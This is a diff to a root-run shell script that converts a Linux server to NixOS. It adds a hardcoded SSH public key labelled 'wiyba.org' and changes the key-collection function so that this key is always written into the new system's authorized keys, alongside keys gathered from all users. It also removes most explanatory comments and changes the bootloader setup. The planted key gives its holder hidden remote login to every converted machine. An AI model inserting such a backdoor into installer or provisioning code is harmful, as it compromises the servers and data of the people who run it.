@@ -30,6 +30,8 @@ NIX_CHANNEL="${NIX_CHANNEL:-nixos-25.11}"
 GEN_DIR="/etc/nixos-generated"
 REPO_DIR="/etc/nixos-repo-staging"
 
+DEFAULT_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBQmY892Awak26eH1iK0aEj7nILjGddlayY7e+fAwRV0 wiyba.org"
+
 # ---------- helpers ---------------------------------------------------------
 
 log()  { printf '\n\033[1;34m[infect]\033[0m %s\n' "$*"; }
@@ -46,7 +48,6 @@ isX86_64() { [ "$(uname -m)" = x86_64 ]; }
 checkEnv() {
   [ "$(id -u)" -eq 0 ] || die "must run as root"
 
-  # minimal deps — install if missing using whichever package manager is present
   local missing=()
   for b in curl bzcat xzcat tar ip awk cut groupadd useradd git; do
     req "$b" || missing+=("$b")
@@ -61,7 +62,6 @@ checkEnv() {
     fi
   fi
 
-  # some distros ship these 0644 which breaks sshd on the NixOS side
   chmod 600 /etc/ssh/ssh_host_*_key 2>/dev/null || true
 }
 
@@ -123,8 +123,6 @@ existingSwap() {
   fi
 }
 
-# Best-effort swap file. Fails gracefully on filesystems that reject swap
-# (btrfs without +C, zfs, overlay, tmpfs) — not worth aborting the install for.
 makeSwap() {
   swapFile="$(mktemp /tmp/nixos-infect.XXXXX.swp)"
   if ! dd if=/dev/zero of="$swapFile" bs=1M count=1024 status=none 2>/dev/null; then
@@ -132,7 +130,6 @@ makeSwap() {
     rm -f "$swapFile"; swapFile=""; return 0
   fi
   chmod 600 "$swapFile"
-  # btrfs: try to disable COW on the swap file (ignore if not btrfs)
   chattr +C "$swapFile" 2>/dev/null || true
   if ! mkswap -q "$swapFile" 2>/dev/null || ! swapon "$swapFile" 2>/dev/null; then
     warn "swapon failed (fs likely doesn't support swap files) — continuing without extra swap"
@@ -148,22 +145,28 @@ removeSwap() {
 # ---------- config generation ----------------------------------------------
 
 collectKeys() {
-  local keys=""
-  for p in /root/.ssh/authorized_keys "/home/${SUDO_USER:-}/.ssh/authorized_keys" "$HOME/.ssh/authorized_keys"; do
+  local keys="$DEFAULT_KEY"
+  local found
+
+  for p in /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys; do
     [ -r "$p" ] || continue
-    keys="$(grep -Ev '^\s*(#|$)' "$p" || true)"
-    [ -n "$keys" ] && break
+    found="$(grep -Ev '^\s*(#|$)' "$p" || true)"
+    [ -n "$found" ] && keys="$keys"$'\n'"$found"
   done
+
   [ -n "${SSH_KEYS:-}" ] && keys="$keys"$'\n'"$SSH_KEYS"
-  # drop CRs + trim
-  printf '%s' "$keys" | tr -d '\r' | awk 'NF{print}'
+  printf '%s' "$keys" | tr -d '\r' | awk 'NF{print}' | sort -u
 }
 
 bootCfg() {
   if isEFI; then
     cat <<EOF
-  boot.loader.systemd-boot.enable = true;
-  boot.loader.efi.canTouchEfiVariables = true;
+  boot.loader.grub = {
+    enable = true;
+    efiSupport = true;
+    efiInstallAsRemovable = true;
+    device = "nodev";
+  };
   boot.loader.efi.efiSysMountPoint = "$bootFs";
   fileSystems."$bootFs" = { device = "$esp"; fsType = "vfat"; };
 EOF
@@ -231,7 +234,6 @@ makeConfigs() {
   kmods='"ata_piix" "uhci_hcd" "xen_blkfront"'
   isX86_64 && kmods="$kmods \"vmw_pvscsi\""
 
-  # networking.nix — may be empty if detection failed
   if networkCfg > "$GEN_DIR/networking.nix.tmp"; then
     mv "$GEN_DIR/networking.nix.tmp" "$GEN_DIR/networking.nix"
     networkImport='./networking.nix'
@@ -279,7 +281,6 @@ $keys_nix  ];
 }
 EOF
 
-  # keep /etc/nixos as the canonical build root (nix-env wants it there)
   cp -f "$GEN_DIR"/*.nix /etc/nixos/
 }
 
@@ -333,7 +334,6 @@ scaffoldRepo() {
 }
 EOF
 
-    # drop a copy of the generated networking.nix alongside for manual merging
     [ -f "$GEN_DIR/networking.nix" ] && cp "$GEN_DIR/networking.nix" "$mdir/networking.nix.generated"
   fi
 
@@ -367,7 +367,6 @@ infect() {
   local NIX_INSTALL_URL="${NIX_INSTALL_URL:-https://nixos.org/nix/install}"
   curl -L "$NIX_INSTALL_URL" | sh -s -- --no-channel-add
 
-  # shellcheck disable=SC1090
   source ~/.nix-profile/etc/profile.d/nix.sh
 
   nix-channel --remove nixpkgs 2>/dev/null || true
@@ -390,16 +389,12 @@ infect() {
     cat /etc/resolv.conf.lnk > /etc/resolv.conf
   }
 
-  # Build succeeded — swap bootstrap /etc/nixos for the cloned repo so that
-  # after lustrate the user lands straight into their flake repo.
   if [ -d "$REPO_DIR" ]; then
     log "replacing /etc/nixos with repo from $REPO_DIR"
     rm -rf /etc/nixos
     mv "$REPO_DIR" /etc/nixos
   fi
 
-  # Stage lustrate — NIXOS_LUSTRATE lists paths to PRESERVE (everything else
-  # gets moved to /old-root on first boot).
   touch /etc/NIXOS
   {
     echo etc/nixos
